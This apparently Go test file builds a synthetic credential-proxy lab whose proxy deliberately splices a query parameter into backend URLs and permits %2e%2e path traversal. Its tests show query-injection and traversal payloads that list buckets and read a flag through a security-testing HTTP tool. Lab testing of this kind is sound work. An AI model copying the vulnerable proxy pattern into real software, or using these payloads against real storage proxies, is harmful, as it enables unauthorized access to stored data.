package kernel

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"path"
	"strings"
	"testing"
)

// 合成靶场：一个「凭证代理」。
//
// 形态与任何真实平台无关，但复刻了这类服务最容易犯的错：
//
//	代理把 ?sas= 的「值」原样拼进后端 URL
//	→ sas 的值其实是整段 query string，可以往里注入任意参数
//
// 同时复刻第二个坑：路径穿越必须写成 %2e%2e（裸 .. 会被框架规范化掉）。
const (
	rangeProxyToken = "range-token-7c1f"
	rangeProxyFlag  = "flag{range_proxy_fixture}"
)

// startCredProxy 起一套 backend + proxy，返回代理地址。
func startCredProxy(t *testing.T) string {
	t.Helper()

	objects := map[string]string{
		"public/readme.txt": "just a public note",
		"vault/secret.txt":  rangeProxyFlag,
	}
	buckets := []string{"public", "vault"}

	// 后端：/store/<bucket>/<key>?comp=list&restype=container&sas=<token>
	backend := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Query().Get("sig") != rangeProxyToken {
			w.WriteHeader(http.StatusForbidden)
			fmt.Fprint(w, `<Error><Code>AuthorizationFailure</Code></Error>`)
			return
		}
		// 后端自己做路径归一化（模拟对象存储服务端）
		clean := path.Clean(r.URL.Path)
		rest := strings.TrimPrefix(strings.TrimPrefix(clean, "/store"), "/")

		// 列举：restype=container & comp=list
		if r.URL.Query().Get("comp") == "list" && r.URL.Query().Get("restype") == "container" {
			if rest == "" { // 账号根 → 列桶
				fmt.Fprintf(w, "<EnumerationResults><Buckets>%s</Buckets></EnumerationResults>", strings.Join(buckets, ","))
				return
			}
			var keys []string
			for k := range objects {
				if strings.HasPrefix(k, rest+"/") {
					keys = append(keys, k)
				}
			}
			fmt.Fprintf(w, "<EnumerationResults><Container>%s</Container><Keys>%s</Keys></EnumerationResults>",
				rest, strings.Join(keys, ","))
			return
		}

		// 读对象
		if v, ok := objects[rest]; ok {
			fmt.Fprint(w, v)
			return
		}
		w.WriteHeader(http.StatusNotFound)
		fmt.Fprint(w, `<Error><Code>BlobNotFound</Code></Error>`)
	}))
	t.Cleanup(backend.Close)

	// 代理：/api/sas/<bucket>/<key>?sas=<整段 query 原样塞进后端>
	proxy := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		esc := r.URL.EscapedPath() // 用 EscapedPath：保留 %2e%2e，不提前归一化
		rest := strings.TrimPrefix(esc, "/api/sas/")
		if rest == esc || rest == "" {
			w.WriteHeader(http.StatusNotFound)
			fmt.Fprint(w, `{"error":"endpoint not found"}`)
			return
		}
		sas := r.URL.Query().Get("sas") // 解码一次：拿到的是「整段 query」
		if sas == "" {
			w.WriteHeader(http.StatusBadRequest)
			fmt.Fprint(w, `{"error":"sas parameter required"}`)
			return
		}
		target := backend.URL + "/store/" + rest + "?" + sas
		resp, err := http.Get(target)
		if err != nil {
			w.WriteHeader(http.StatusBadGateway)
			return
		}
		defer resp.Body.Close()
		buf := make([]byte, 4096)
		n, _ := resp.Body.Read(buf)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"content":%q,"status_code":%d}`, string(buf[:n]), resp.StatusCode)
	}))
	t.Cleanup(proxy.Close)

	return proxy.URL
}

// TestProxyQueryInjection 证明：只有把 restype/comp 注进 sas 的「值」里才能列目录。
func TestProxyQueryInjection(t *testing.T) {
	base := startCredProxy(t)
	ts := newRangeToolSet(t)

	// ① 正常读一个对象：sas 只放 token
	out := call(t, ts, "http", fmt.Sprintf(`{"url":%q}`, base+"/api/sas/vault/secret.txt?sas=sig%3D"+rangeProxyToken))
	if !strings.Contains(out, rangeProxyFlag) {
		t.Fatalf("直读对象失败:\n%s", out)
	}

	// ② 想列举：只把 comp=list 塞进路径段是没用的（后端把它当 key）
	out = call(t, ts, "http", fmt.Sprintf(`{"url":%q}`, base+"/api/sas/vault/secret.txt%3Fcomp=list&sas=sig%3D"+rangeProxyToken))
	if strings.Contains(out, "EnumerationResults") {
		t.Fatalf("路径段注入不该成功，说明靶场没有还原这个坑:\n%s", out)
	}

	// ③ 正解：用 inject 把整段 query 注进 sas 的值里
	q := fmt.Sprintf(`{"url":%q,"inject":{"param":"sas","value":%q}}`,
		base+"/api/sas/x/%2e%2e", "restype=container&comp=list&sig="+rangeProxyToken)
	out = call(t, ts, "http", q)
	if !strings.Contains(out, "EnumerationResults") || !strings.Contains(out, "vault") {
		t.Fatalf("注进 sas 值后应能列桶:\n%s", out)
	}
	// 回显实际 URL：注入类漏洞靠它确认拼接是否符合预期
	if !strings.Contains(out, "实际请求:") {
		t.Errorf("用了 inject 却没回显实际 URL:\n%s", out)
	}
}

// TestProxyInjectionListsObjects 走完整链路：穿回目标桶 → 列 key → 读到 flag。
func TestProxyInjectionListsObjects(t *testing.T) {
	base := startCredProxy(t)
	ts := newRangeToolSet(t)

	q := fmt.Sprintf(`{"url":%q,"inject":{"param":"sas","value":%q}}`,
		base+"/api/sas/vault/%2e%2e%2fvault", "restype=container&comp=list&sig="+rangeProxyToken)
	out := call(t, ts, "http", q)
	if !strings.Contains(out, "vault/secret.txt") {
		t.Fatalf("应列出 vault 下的对象:\n%s", out)
	}

	// 列到 key 之后照常读
	out = call(t, ts, "http", fmt.Sprintf(`{"url":%q}`, base+"/api/sas/vault/secret.txt?sas=sig%3D"+rangeProxyToken))
	if !strings.Contains(out, rangeProxyFlag) {
		t.Fatalf("读对象失败:\n%s", out)
	}
}

// TestRawQueryPassthrough 校验 raw_query：整段原样拼接、不做编码（调用方自己负责）。
func TestRawQueryPassthrough(t *testing.T) {
	base := startCredProxy(t)
	ts := newRangeToolSet(t)

	q := fmt.Sprintf(`{"url":%q,"raw_query":%q}`,
		base+"/api/sas/x/%2e%2e", "sas=restype%3Dcontainer%26comp%3Dlist%26sig%3D"+rangeProxyToken)
	out := call(t, ts, "http", q)
	if !strings.Contains(out, "EnumerationResults") {
		t.Fatalf("raw_query 拼接失败:\n%s", out)
	}
}

// TestInjectValuePreservesPercentEncoding 锁住转义边界：
// 只该动 & + # 空格，已经写好的 %2B / %3D 必须原样留下 ——
// 否则「签名里本来就编码过的 + / =」会被二次编码，后端验签必挂。
func TestInjectValuePreservesPercentEncoding(t *testing.T) {
	base := startCredProxy(t)
	ts := newRangeToolSet(t)

	q := fmt.Sprintf(`{"url":%q,"inject":{"param":"sas","value":%q}}`,
		base+"/api/sas/vault/secret.txt",
		"a=1&b=2&sig=x%2By%3D&sp=rw")
	out := call(t, ts, "http", q)

	// URL 形如 ...?sas=a=1%26b=2%26sig=x%2By%3D%26sp=rw
	// （param= 之后的第一段不转义 = 也没关系，服务端按第一个 = 切）
	line := ""
	for _, l := range strings.Split(out, "\n") {
		if strings.HasPrefix(l, "实际请求:") {
			line = l
		}
	}
	if line == "" {
		t.Fatalf("没有回显实际 URL:\n%s", out)
	}
	if strings.Contains(line, "%252B") || strings.Contains(line, "%252F") {
		t.Fatalf("%%2B 被二次编码了（真实环境会导致验签失败）:\n%s", line)
	}
	if !strings.Contains(line, "x%2By%3D") {
		t.Fatalf("原有的 %%2B/%%3D 没有原样保留:\n%s", line)
	}
	if strings.Contains(line, "&sig=") || strings.Contains(line, "&b=") {
		t.Fatalf("value 里的 & 没有被转义，会被当成参数分隔符:\n%s", line)
	}
}
